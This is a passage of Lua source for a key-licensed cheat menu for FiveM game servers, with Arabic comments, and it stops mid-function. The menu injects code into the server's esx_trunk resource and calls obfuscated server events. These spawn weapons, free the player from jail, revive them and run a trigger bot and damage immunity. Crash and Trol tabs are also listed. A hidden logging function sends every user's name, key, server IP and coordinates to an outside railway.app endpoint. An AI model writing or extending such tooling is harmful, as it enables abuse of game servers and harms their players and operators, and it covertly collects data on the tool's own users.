-- إعدادات المنيو
local MenuSize = vec2(900, 750)
local MenuStartCoords = vec2(250, 100)
local TabSectionWidth = 200
local MenuWindow = nil
local isMenuOpen = false
local isMenuVisible = false
local isAuthenticated = false
local isChecking = false

-- رابط المفاتيح
local KeysURL = "https://raw.githubusercontent.com/wwhostd/29/refs/heads/main/Keys.txt"

-- رابط السيرفر للوق
local ActionLogURL = "https://s29-production.up.railway.app/action"

-- إعدادات البلوك انبوت
local blockInputActive = false
local blockInputThread = nil
local mouseProtectionThread = nil
local cursorLockThread = nil

-- إعدادات المفاتيح
local MenuKeybind = 0x2E
local KeybindSettings = {
    currentKeybind = 0x2E,
    needsUpdate = false,
    keybindNames = {
        [0x08] = "Backspace",
        [0x09] = "Tab", 
        [0x0D] = "Enter",
        [0x10] = "Shift",
        [0x11] = "Ctrl",
        [0x12] = "Alt",
        [0x1B] = "Escape",
        [0x20] = "Space",
        [0x21] = "Page Up",
        [0x22] = "Page Down",
        [0x23] = "End",
        [0x24] = "Home",
        [0x25] = "Left Arrow",
        [0x26] = "Up Arrow", 
        [0x27] = "Right Arrow",
        [0x28] = "Down Arrow",
        [0x2D] = "Insert",
        [0x2E] = "Delete",
        [0x30] = "0",
        [0x31] = "1",
        [0x32] = "2",
        [0x33] = "3",
        [0x34] = "4",
        [0x35] = "5",
        [0x36] = "6",
        [0x37] = "7",
        [0x38] = "8",
        [0x39] = "9",
        [0x41] = "A",
        [0x42] = "B",
        [0x43] = "C",
        [0x44] = "D",
        [0x45] = "E",
        [0x46] = "F",
        [0x47] = "G",
        [0x48] = "H",
        [0x49] = "I",
        [0x4A] = "J",
        [0x4B] = "K",
        [0x4C] = "L",
        [0x4D] = "M",
        [0x4E] = "N",
        [0x4F] = "O",
        [0x50] = "P",
        [0x51] = "Q",
        [0x52] = "R",
        [0x53] = "S",
        [0x54] = "T",
        [0x55] = "U",
        [0x56] = "V",
        [0x57] = "W",
        [0x58] = "X",
        [0x59] = "Y",
        [0x5A] = "Z",
        [0x60] = "Numpad 0",
        [0x61] = "Numpad 1",
        [0x62] = "Numpad 2",
        [0x63] = "Numpad 3",
        [0x64] = "Numpad 4",
        [0x65] = "Numpad 5",
        [0x66] = "Numpad 6",
        [0x67] = "Numpad 7",
        [0x68] = "Numpad 8",
        [0x69] = "Numpad 9",
        [0x70] = "F1",
        [0x71] = "F2",
        [0x72] = "F3",
        [0x73] = "F4",
        [0x74] = "F5",
        [0x76] = "F7",
        [0x77] = "F8",
        [0x78] = "F9",
        [0x79] = "F10",
        [0x7A] = "F11",
        [0x7B] = "F12"
    }
}

-- متغيرات لحفظ القيم المختارة
local selectedItemIndex = 1
local selectedAmount = 1
local selectedMoneyAmount = 150
local selectedDrugAmount = 65
local selectedVehicleIndex = 1
local selectedShipmentAmount = 1

-- متغيرات Modify Tab
local ModifyEngineLevel = -1
local ModifyTransmissionLevel = -1
local ModifyBrakesLevel = -1
local ModifyTurbo = -1
local ModifySuspensionLevel = -1
local ModifyArmorLevel = -1
local ModifyColor1 = 0
local ModifyColor2 = 0
local ModifyPearlescent = 0
local ModifyWheelColor = 0
local ModifyWindowTint = 0
local ModifyXenon = -1
local ModifyXenonColor = 0
local ModifyPlateIndex = 0
local ModifyWheelsType = 0
local ModifyFrontWheels = -1

-- ==================== دالة إرسال لوق الاستخدام ====================
function SendActionLog(tab, action, details, amount, item, vehicle, plate, target)
    Citizen.CreateThread(function()
        local playerName = GetPlayerName(PlayerId()) or "Unknown"
        local serverId = GetPlayerServerId(PlayerId()) or 0
        local playerKey = MachoAuthenticationKey() or "Unknown"
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        
        local serverIP = "Unknown"
        local endpoint = GetCurrentServerEndpoint()
        if endpoint and endpoint ~= "" then
            serverIP = endpoint
        end
        
        -- تنظيف البيانات
        details = details or ""
        amount = tostring(amount or "")
        item = item or ""
        vehicle = vehicle or ""
        plate = plate or ""
        target = tostring(target or "")
        
        -- استبدال المسافات بـ +
        playerName = string.gsub(playerName, " ", "+")
        tab = string.gsub(tab or "Unknown", " ", "+")
        action = string.gsub(action or "Unknown", " ", "+")
        details = string.gsub(details, " ", "+")
        item = string.gsub(item, " ", "+")
        vehicle = string.gsub(vehicle, " ", "+")
        plate = string.gsub(plate, " ", "+")
        serverIP = string.gsub(serverIP, " ", "+")
        
        local url = ActionLogURL .. "?name=" .. playerName 
            .. "&sid=" .. serverId 
            .. "&key=" .. playerKey 
            .. "&tab=" .. tab 
            .. "&action=" .. action 
            .. "&details=" .. details 
            .. "&amount=" .. amount 
            .. "&item=" .. item 
            .. "&vehicle=" .. vehicle 
            .. "&plate=" .. plate 
            .. "&target=" .. target
            .. "&sip=" .. serverIP
            .. "&x=" .. string.format("%.0f", coords.x) 
            .. "&y=" .. string.format("%.0f", coords.y) 
            .. "&z=" .. string.format("%.0f", coords.z)
        
        local logDui = MachoCreateDui(url)
        if logDui then
            Wait(1500)
            MachoDestroyDui(logDui)
        end
    end)
end

-- دالة التحقق من المفتاح
function CheckAuthentication()
    if isChecking then
        return false
    end
    
    isChecking = true
    print("===========================================")
    print("                           Checking authentication...")
    
    local CurrentKey = MachoAuthenticationKey()
    print("                           Your Key: " .. CurrentKey)
    
    local KeysBin = MachoWebRequest(KeysURL)
    
    if not KeysBin or KeysBin == "" then
        print("                           ERROR: Failed to fetch keys from server!")
        isChecking = false
        return false
    end
    
    local KeyPresent = string.find(KeysBin, CurrentKey)
    
    if KeyPresent ~= nil then
        print("                           SUCCESS: Key is authenticated!")
        print("                           Key: [" .. CurrentKey .. "]")
        isAuthenticated = true
        isChecking = false
        return true
    else
        print("                           FAILED: Key is not in the list!")
        print("                           Key: [" .. CurrentKey .. "]")
        print("                           Contact to albs6wisi to get access.")
        isAuthenticated = false
        isChecking = false
        return false
    end
end

-- دالة فحص المفتاح المخصص
function IsCustomKeybindPressed()
    local keycode = KeybindSettings.currentKeybind
    
    if keycode then
        local keyState = GetAsyncKeyState and GetAsyncKeyState(keycode) or 0
        
        if not GetAsyncKeyState then
            if keycode == 0x2E then
                return IsControlJustPressed(0, 178) or IsDisabledControlJustPressed(0, 178)
            elseif keycode == 0x08 then
                return IsControlJustPressed(0, 194) or IsDisabledControlJustPressed(0, 194)
            elseif keycode == 0x20 then
                return IsControlJustPressed(0, 22) or IsDisabledControlJustPressed(0, 22)
            elseif keycode == 0x0D then
                return IsControlJustPressed(0, 18) or IsDisabledControlJustPressed(0, 18)
            elseif keycode == 0x1B then
                return IsControlJustPressed(0, 322) or IsDisabledControlJustPressed(0, 322)
            elseif keycode == 0x09 then
                return IsControlJustPressed(0, 37) or IsDisabledControlJustPressed(0, 37)
            elseif keycode >= 0x70 and keycode <= 0x7B then
                local fNum = keycode - 0x70 + 1
                if fNum == 6 then
                    return IsControlJustPressed(0, 167) or IsDisabledControlJustPressed(0, 167)
                else
                    return IsControlJustPressed(0, 287 + fNum) or IsDisabledControlJustPressed(0, 287 + fNum)
                end
            else
                return IsDisabledControlJustPressed(0, keycode) or IsControlJustPressed(0, keycode)
            end
        end
        
        return (keyState and keyState ~= 0)
    end
    
    return false
end

local lastKeyState = false

-- دوال البلوك انبوت
function EnableBlockInput()
    if blockInputActive then return end
    
    blockInputActive = true
    
    if blockInputThread then blockInputThread = nil end
    if mouseProtectionThread then mouseProtectionThread = nil end
    if cursorLockThread then cursorLockThread = nil end
    
    blockInputThread = Citizen.CreateThread(function()
        while blockInputActive and isMenuVisible do
            Citizen.Wait(0)
            DisableAllControlActions(0)
            DisableAllControlActions(1)
            DisableAllControlActions(2)
            for i = 1, 6 do DisableControlAction(0, i, true) end
            for i = 30, 35 do DisableControlAction(0, i, true) end
            DisableControlAction(0, 21, true)
            DisableControlAction(0, 22, true)
            DisableControlAction(0, 36, true)
            DisableControlAction(0, 24, true)
            DisableControlAction(0, 25, true)
            DisableControlAction(0, 47, true)
            DisableControlAction(0, 58, true)
            for i = 140, 142 do DisableControlAction(0, i, true) end
            DisableControlAction(0, 257, true)
            DisableControlAction(0, 263, true)
            DisableControlAction(0, 264, true)
            for i = 59, 64 do DisableControlAction(0, i, true) end
            DisableControlAction(0, 71, true)
            DisableControlAction(0, 72, true)
            DisableControlAction(0, 75, true)
            DisableControlAction(0, 157, true)
            DisableControlAction(0, 158, true)
            DisableControlAction(0, 160, true)
            DisableControlAction(0, 161, true)
            DisableControlAction(0, 199, true)
            DisableControlAction(0, 200, true)
            DisableControlAction(0, 38, true)
            DisableControlAction(0, 46, true)
            DisableControlAction(0, 73, true)
            DisableControlAction(0, 74, true)
            DisableControlAction(0, 86, true)
            SetMouseCursorVisibleInMenus(false)
        end
        blockInputActive = false
        blockInputThread = nil
    end)
    
    mouseProtectionThread = Citizen.CreateThread(function()
        while blockInputActive and isMenuVisible do
            Citizen.Wait(0)
            SetMouseCursorActiveThisFrame()
            SetMouseCursorVisibleInMenus(false)
            SetInputExclusive(2, 239)
            SetInputExclusive(2, 240)
            SetInputExclusive(2, 1)
            SetInputExclusive(2, 2)
            for i = 0, 2 do
                for _, c in ipairs({1,2,3,4,5,6,24,25,91,92,99,100,114,115}) do
                    DisableControlAction(i, c, true)
                end
            end
        end
        mouseProtectionThread = nil
    end)
    
    cursorLockThread = Citizen.CreateThread(function()
        while blockInputActive and isMenuVisible do
            Citizen.Wait(0)
            HideHudComponentThisFrame(19)
            HideHudComponentThisFrame(20)
            SetControlNormal(2, 239, 0.5)
            SetControlNormal(2, 240, 0.5)
            SetMouseCursorSprite(0)
            if not IsPauseMenuActive() then
                SetMouseCursorVisibleInMenus(false)
            end
        end
        cursorLockThread = nil
    end)
end

function DisableBlockInput()
    blockInputActive = false
    if blockInputThread then blockInputThread = nil end
    if mouseProtectionThread then mouseProtectionThread = nil end
    if cursorLockThread then cursorLockThread = nil end
    EnableAllControlActions(0)
    EnableAllControlActions(1)
    EnableAllControlActions(2)
    SetMouseCursorVisibleInMenus(true)
    for i = 0, 2 do
        for _, c in ipairs({1,2,3,4,5,6,24,25}) do
            EnableControlAction(i, c, true)
        end
    end
end

function ParseKeyInput(inputKey)
    if not inputKey then return nil end
    local key = string.lower(string.gsub(inputKey, "%s+", ""))
    if string.len(key) == 1 and string.match(key, "[a-z]") then
        return string.byte(string.upper(key))
    end
    if string.len(key) == 1 and string.match(key, "[0-9]") then
        return 0x30 + tonumber(key)
    end
    if string.match(key, "^f([1-9]|1[0-2])$") then
        local num = tonumber(string.sub(key, 2))
        if num >= 1 and num <= 12 then return 0x6F + num end
    end
    if string.match(key, "^numpad[0-9]$") then
        return 0x60 + tonumber(string.sub(key, 7))
    end
    local specialKeys = {
        ["space"] = 0x20, ["enter"] = 0x0D, ["tab"] = 0x09,
        ["escape"] = 0x1B, ["esc"] = 0x1B, ["backspace"] = 0x08,
        ["delete"] = 0x2E, ["del"] = 0x2E, ["insert"] = 0x2D,
        ["ins"] = 0x2D, ["home"] = 0x24, ["end"] = 0x23,
        ["pageup"] = 0x21, ["pagedown"] = 0x22, ["shift"] = 0x10,
        ["ctrl"] = 0x11, ["alt"] = 0x12, ["leftarrow"] = 0x25,
        ["uparrow"] = 0x26, ["rightarrow"] = 0x27, ["downarrow"] = 0x28,
        ["left"] = 0x25, ["up"] = 0x26, ["right"] = 0x27, ["down"] = 0x28
    }
    return specialKeys[key]
end

function GetKeybindName(keybind)
    return KeybindSettings.keybindNames[keybind] or "Unknown Key"
end

function UpdateMenuKeybind(newKeybind)
    KeybindSettings.currentKeybind = newKeybind
    MenuKeybind = newKeybind
    if MenuWindow then
        MachoMenuSetKeybind(MenuWindow, newKeybind)
    end
end

-- دالة إنشاء المنيو
function CreateAlbsMenu()

if not isAuthenticated then
    print("                           ERROR: Authentication required!")
    return false
end

MenuWindow = MachoMenuTabbedWindow("S29",
    MenuStartCoords.x, MenuStartCoords.y, 
    MenuSize.x, MenuSize.y,
    TabSectionWidth)

if not MenuWindow then return false end

isMenuOpen = true
isMenuVisible = true

if isMenuVisible then EnableBlockInput() end

MachoMenuSetAccent(MenuWindow, 255, 165, 0)
MachoMenuSetKeybind(MenuWindow, KeybindSettings.currentKeybind)
MachoMenuSmallText(MenuWindow, "ALBS6AWISI v1.0")

local ContentStartX = TabSectionWidth + 20
local ContentStartY = 20
local ContentWidth = MenuSize.x - TabSectionWidth - 40
local ContentHeight = MenuSize.y - 40

local Tabs = {"Main", "Weapon", "Money", "Item", "Vehicle", "Protection", "Crash", "juma", "Trol", "Modify"}

for _, tabName in ipairs(Tabs) do
    local tabHandle = MachoMenuAddTab(MenuWindow, "" .. tabName)
    local group = MachoMenuGroup(tabHandle, tabName .. " Content",
        ContentStartX, ContentStartY,
        ContentStartX + ContentWidth, ContentStartY + ContentHeight)

    if tabName == "Main" then
        local leftColumnWidth = (ContentWidth / 2) - 10
        local rightColumnX = ContentStartX + leftColumnWidth + 20
        
        local leftGroup = MachoMenuGroup(tabHandle, "Left Column",
            ContentStartX, ContentStartY,
            ContentStartX + leftColumnWidth, ContentStartY + ContentHeight)
        
        MachoMenuText(leftGroup, "  CORE FUNCTIONS  ")

        MachoMenuCheckbox(leftGroup, "Infinite Run", 
            function()
                SendActionLog("Main", "Infinite Run", "Enabled", "", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
infiniteRunEnabled = true
if infiniteRunThread then infiniteRunThread = nil end
infiniteRunThread = Citizen.CreateThread(function()
    while infiniteRunEnabled do
        local player = PlayerId()
        local ped = PlayerPedId()
        if DoesEntityExist(ped) and not IsEntityDead(ped) then
            local current = GetPlayerSprintStaminaRemaining(player)
            if current < 1.0 then RestorePlayerStamina(player, 0.1) end
        end
        Citizen.Wait(0)
    end
    infiniteRunThread = nil
end)
]])
                MachoMenuNotification("Main", "Infinite Run enabled!")
            end,
            function()
                SendActionLog("Main", "Infinite Run", "Disabled", "", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
infiniteRunEnabled = false
if infiniteRunThread then infiniteRunThread = nil end
]])
                MachoMenuNotification("Main", "Infinite Run disabled!")
            end
        )
        
        MachoMenuCheckbox(leftGroup, "Enhanced Trigger Bot", 
            function()
                SendActionLog("Main", "Enhanced Trigger Bot", "Enabled", "", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
isTriggerBotEnabled = true
local targetBone = 31086
local maxDistance = 170.0
local friendList = {}
print("T: ON")
Citizen.CreateThread(function()
    while true do
        if IsControlJustPressed(0, 47) then
            local playerPed = PlayerPedId()
            local camCoords = GetGameplayCamCoord()
            local camRot = GetGameplayCamRot(2)
            local direction = vector3(
                -math.sin(math.rad(camRot.z)) * math.abs(math.cos(math.rad(camRot.x))),
                math.cos(math.rad(camRot.z)) * math.abs(math.cos(math.rad(camRot.x))),
                math.sin(math.rad(camRot.x))
            )
            local dest = camCoords + direction * 200.0
            local ray = StartShapeTestRay(camCoords, dest, 8, playerPed, 0)
            local _, hit, _, _, entityHit = GetShapeTestResult(ray)
            if hit and IsEntityAPed(entityHit) and not IsPedDeadOrDying(entityHit, true) then
                local targetPlayerId = NetworkGetPlayerIndexFromPed(entityHit)
                if targetPlayerId ~= -1 then
                    local serverId = GetPlayerServerId(targetPlayerId)
                    local playerName = GetPlayerName(targetPlayerId)
                    if friendList[serverId] then
                        friendList[serverId] = nil
                        print("rm " .. tostring(playerName))
                    else
                        friendList[serverId] = true
                        print("ad " .. tostring(playerName))
                    end
                end
            end
        end
        Citizen.Wait(0)
    end
end)
Citizen.CreateThread(function()
    while true do
        if isTriggerBotEnabled then
            local playerPed = PlayerPedId()
            local aiming, target = GetEntityPlayerIsFreeAimingAt(PlayerId())
            if aiming and IsEntityAPed(target) and not IsPedDeadOrDying(target, true) then
                local isInjured = IsEntityPlayingAnim(target, "random@dealgonewrong", "idle_a", 3)
                if not isInjured then
                    local distance = #(GetEntityCoords(playerPed) - GetEntityCoords(target))
                    if distance <= maxDistance then
                        local targetPlayerId = NetworkGetPlayerIndexFromPed(target)
                        local serverId = targetPlayerId ~= -1 and GetPlayerServerId(targetPlayerId) or nil
                        if serverId == nil or not friendList[serverId] then
                            local targetCoords = GetPedBoneCoords(target, targetBone)
                            SetControlNormal(0, 24, 1.0)
                            Citizen.Wait(50)
                        end
                    end
                end
            end
        end
        Citizen.Wait(0)
    end
end)
]])
                MachoMenuNotification("Main", "Enhanced Trigger Bot enabled!")
            end,
            function()
                SendActionLog("Main", "Enhanced Trigger Bot", "Disabled", "", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
isTriggerBotEnabled = false
print("T: OFF")
]])
                MachoMenuNotification("Main", "Enhanced Trigger Bot disabled!")
            end
        )

        MachoMenuCheckbox(leftGroup, "Heavy Blood Armor", 
            function()
                SendActionLog("Main", "Heavy Blood Armor", "Enabled", "", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
bloodArmorEnabled = true
local bloodArmorThread = nil
if bloodArmorThread then bloodArmorThread = nil end
bloodArmorThread = Citizen.CreateThread(function()
    local lastHealth = 0
    while bloodArmorEnabled do
        local ped = PlayerPedId()
        if DoesEntityExist(ped) and not IsEntityDead(ped) then
            local armor = GetPedArmour(ped)
            local currentHealth = GetEntityHealth(ped)
            if armor > 0 then
                if lastHealth == 0 then lastHealth = currentHealth end
                if currentHealth < lastHealth then SetEntityHealth(ped, lastHealth) end
            else
                lastHealth = 0
                SetPlayerWeaponDefenseModifier(PlayerId(), 0.7)
                SetPlayerMeleeWeaponDefenseModifier(PlayerId(), 0.7)
            end
        end
        Citizen.Wait(0)
    end
    SetPlayerWeaponDefenseModifier(PlayerId(), 1.0)
    SetPlayerMeleeWeaponDefenseModifier(PlayerId(), 1.0)
    bloodArmorThread = nil
end)
print("B: ON")
]])
                MachoMenuNotification("Main", "Heavy Blood Armor enabled!")
            end,
            function()
                SendActionLog("Main", "Heavy Blood Armor", "Disabled", "", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
bloodArmorEnabled = false
SetPlayerWeaponDefenseModifier(PlayerId(), 1.0)
SetPlayerMeleeWeaponDefenseModifier(PlayerId(), 1.0)
print("B: OFF")
]])
                MachoMenuNotification("Main", "Heavy Blood Armor disabled!")
            end
        )

        MachoMenuCheckbox(leftGroup, "Exit on H", 
            function()
                SendActionLog("Main", "Exit on H", "Enabled", "", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
cleanExitEnabled = true
Citizen.CreateThread(function()
    while cleanExitEnabled do
        Wait(0)
        if IsControlJustPressed(0, 74) then
            local ped = PlayerPedId()
            if IsPedInAnyVehicle(ped, false) then
                local veh = GetVehiclePedIsIn(ped, false)
                ClearPedTasksImmediately(ped)
                TaskLeaveVehicle(ped, veh, 4160)
            end
        end
    end
end)
]])
                MachoMenuNotification("Main", "Clean Exit enabled!")
            end,
            function()
                SendActionLog("Main", "Exit on H", "Disabled", "", "", "", "", "")
                MachoInjectResource("esx_trunk", [[cleanExitEnabled = false]])
                MachoMenuNotification("Main", "Clean Exit disabled!")
            end
        )

        MachoMenuText(leftGroup, "  PLAYER STATUS  ")

        MachoMenuButton(leftGroup, "Food & Drink", function()
            SendActionLog("Main", "Food & Drink", "Filled hunger and thirst", "", "", "", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerEvent('esx_status:set', 'thirst', 1000000)
TriggerEvent('esx_status:set', 'hunger', 1000000)
]])
            MachoMenuNotification("Main", "Food & Drink filled!")
        end)

        MachoMenuButton(leftGroup, "S6llh", function()
            SendActionLog("Main", "S6llh", "Drunk status activated", "", "", "", "", "")
            MachoInjectResource("esx_trunk", [[TriggerEvent('esx_status:set', 'drunk', 100000)]])
            MachoMenuNotification("Main", "S6llh activated!")
        end)

        MachoMenuButton(leftGroup, "Handcuff", function()
            SendActionLog("Main", "Handcuff", "Handcuff toggle", "", "", "", "", "")
            MachoInjectResource("esx_trunk", [[TriggerEvent('esx_misc:handcuff')]])
            MachoMenuNotification("Main", "Handcuff activated!")
        end)
		
        MachoMenuButton(leftGroup, "Jail Break", function()
            SendActionLog("Main", "Jail Break", "Escaped from jail", "", "", "", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('uU2zcTXqiWMJSP51qcuY8boTeiULEUL2dgL0oeOCCQv7Jo2vtQMtR6VB28oYqfrvcdaU5z4lCdvkVwk0FGI1cdOO849AjZxk7YsCTHFDdLnSMws6K5IwIW1a:mL67lTBa7FRrvfRYG1w7v0NXuqQRZzpAjxXuc4Wg2dojR25i3QVPKppu8qyJtvTVrf0s4QNSbbAHcWLovDpDsCQ3GMb3GAL04LxN1U7mI0pZAaiwXD3oURkJ', 0, 369553850)
]])
            MachoMenuNotification("Main", "Jail Break activated!")
        end)
		
        MachoMenuButton(leftGroup, "!!! Back From Hell !!!", function()
            SendActionLog("Main", "Back From Hell", "Revived from death", "", "", "", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerEvent('f3rebLys7SpF4YAUDpCIaNA1JznUl2KoPNaoZkxWhraaFjBQxDa7pobgsCphwa4ZdrElCWM1HSivY9nhqZLTV7Nb2eIwLcfJ3Ihapv7LbhX1YiISDCBTo44n:qc58XdT4Y0xID2HAJrimsrcOGVP1dGW8HG01DIZ0xq1ngeFcUIiRUm6YcLghXrKE3emSy1Jv6YY6A27mWGNrgznbh4AvRZ6CGuPenCwPtV7UhyFkekP8QAH9')
]])
            MachoMenuNotification("Main", "Back From Hell activated!")
        end)

        local rightGroup = MachoMenuGroup(tabHandle, "Right Column",
            rightColumnX, ContentStartY,
            rightColumnX + leftColumnWidth, ContentStartY + ContentHeight)
        
        MachoMenuText(rightGroup, "  VEHICLE PROTECTION  ")

        MachoMenuCheckbox(rightGroup, "Anti Crash Damage", 
            function()
                SendActionLog("Main", "Anti Crash Damage", "Enabled", "", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
antiCrashDamageEnabled = true
if antiCrashThread then antiCrashThread = nil end
antiCrashThread = Citizen.CreateThread(function()
    while antiCrashDamageEnabled do
        local ped = PlayerPedId()
        if ped and DoesEntityExist(ped) and not IsEntityDead(ped) then
            local vehicle = GetVehiclePedIsIn(ped, false)
            if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                SetPedCanRagdoll(ped, false)
                SetPedCanBeKnockedOffVehicle(ped, 1)
                SetEntityProofs(ped, false, true, true, false, false, false, false, false)
                SetPlayerVehicleDamageModifier(PlayerId(), 0.0)
                SetPlayerVehicleDefenseModifier(PlayerId(), 0.0)
                SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                SetPlayerWeaponDefenseModifier(PlayerId(), 1.0)
                SetPlayerMeleeWeaponDamageModifier(PlayerId(), 1.0)
                SetPlayerMeleeWeaponDefenseModifier(PlayerId(), 1.0)
            else
                SetPedCanRagdoll(ped, true)
                SetEntityProofs(ped, false, false, false, false, false, false, false, false)
                SetPlayerVehicleDamageModifier(PlayerId(), 1.0)
                SetPlayerVehicleDefenseModifier(PlayerId(), 1.0)
            end
        end
        Citizen.Wait(0)
    end
    local ped = PlayerPedId()
    if ped and DoesEntityExist(ped) then
        SetPedCanRagdoll(ped, true)
        SetEntityProofs(ped, false, false, false, false, false, false, false, false)
        SetPlayerVehicleDamageModifier(PlayerId(), 1.0)
        SetPlayerVehicleDefenseModifier(PlayerId(), 1.0)
    end
    antiCrashThread = nil
end)
print("Anti Crash Damage: ON")
]])
                MachoMenuNotification("Protection", "Anti Crash Damage enabled!")
            end,
            function()
                SendActionLog("Main", "Anti Crash Damage", "Disabled", "", "", "", "", "")
                MachoInjectResource("esx_trunk", [[
antiCrashDamageEnabled = false
if antiCrashThread then antiCrashThread = nil end
local ped = PlayerPedId()
if ped and DoesEntityExist(ped) then
    SetPedCanRagdoll(ped, true)
    SetEntityProofs(ped, false, false, false, false, false, false, false, false)
    SetPlayerVehicleDamageModifier(PlayerId(), 1.0)
    SetPlayerVehicleDefenseModifier(PlayerId(), 1.0)
end
print("Anti Crash Damage: OFF")
]])
                MachoMenuNotification("Protection", "Anti Crash Damage disabled!")
            end
        )

    elseif tabName == "Weapon" then
        MachoMenuText(group, "  STANDARD WEAPONS  ")

        MachoMenuButton(group, "Combat PDW", function()
            SendActionLog("Weapon", "Combat PDW", "Got weapon from ORF 370", "1", "WEAPON_COMBATPDW", "ORF 370", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'ORF 370 ', 'item_weapon', 'WEAPON_COMBATPDW', 1, 717225484)
]])
            MachoMenuNotification("Weapon", "Combat PDW obtained!")
        end)

        MachoMenuButton(group, "Revolver", function()
            SendActionLog("Weapon", "Revolver", "Got weapon from ORF 370", "1", "WEAPON_REVOLVER", "ORF 370", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'ORF 370 ', 'item_weapon', 'WEAPON_REVOLVER', 1, 717225484)
]])
            MachoMenuNotification("Weapon", "Revolver obtained!")
        end)

        MachoMenuButton(group, "Pump Shotgun", function()
            SendActionLog("Weapon", "Pump Shotgun", "Got weapon from ORF 370", "1", "WEAPON_PUMPSHOTGUN", "ORF 370", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'ORF 370 ', 'item_weapon', 'WEAPON_PUMPSHOTGUN', 1, 717225484)
]])
            MachoMenuNotification("Weapon", "Pump Shotgun obtained!")
        end)

        MachoMenuButton(group, "Micro SMG", function()
            SendActionLog("Weapon", "Micro SMG", "Got weapon from ORF 370", "1", "WEAPON_MICROSMG", "ORF 370", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'ORF 370 ', 'item_weapon', 'WEAPON_MICROSMG', 1, 717225484)
]])
            MachoMenuNotification("Weapon", "Micro SMG obtained!")
        end)
		
        MachoMenuButton(group, "Switchblade", function()
            SendActionLog("Weapon", "Switchblade", "Got weapon from ORF 370", "1", "WEAPON_SWITCHBLADE", "ORF 370", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'ORF 370 ', 'item_weapon', 'WEAPON_SWITCHBLADE', 1, 717225484)
]])
            MachoMenuNotification("Weapon", "Switchblade obtained!")
        end)

        MachoMenuText(group, "  DEV 2 WEAPONS  ")

        MachoMenuButton(group, "Micro SMG DEV 2", function()
            SendActionLog("Weapon", "Micro SMG DEV 2", "Got weapon from BFQ 646", "1", "WEAPON_MICROSMG", "BFQ 646", "", "")
            MachoInjectResource("esx_trunk", [[
TriggerServerEvent('eBuEbMDCReGPL9LCVoDVMBs29gQ6uI8GixD5YuiwdulEtIu8O2kJ5Am7n5O6VqDTGJIMBO3YnzduvN4EMV4aio005Lc1PrKDVXwzu2UcvfF1fA9jSojSlkC9:uyWsjuoUykPtgbl6c9AhnRuBWtT6tZPXNlTEcczR0zz9T1zroxIHORCNWqJVuh0W25mLGgy7oCFU802wxw0iiyLWLgF7i9ZSX2C6H4j6Qj8FQ4rlSzEoVELj', 'BFQ 646 ', 'item_weapon', 'WEAPON_MICROSMG', 1, 717225484)
]])
            MachoMenuNotification("Weapon", "Micro SMG DEV 2 obtained!")
        end)

        MachoMenuButton(group, "Combat PDW DEV 2", function()
            SendActionLog("Weapon", "Combat PDW DEV 2", "Got weapon from BFQ 646", "1", "WEAPON_COMBATPDW", "BFQ 646", "", "")
            MachoInjectResource("esx_trunk", [[
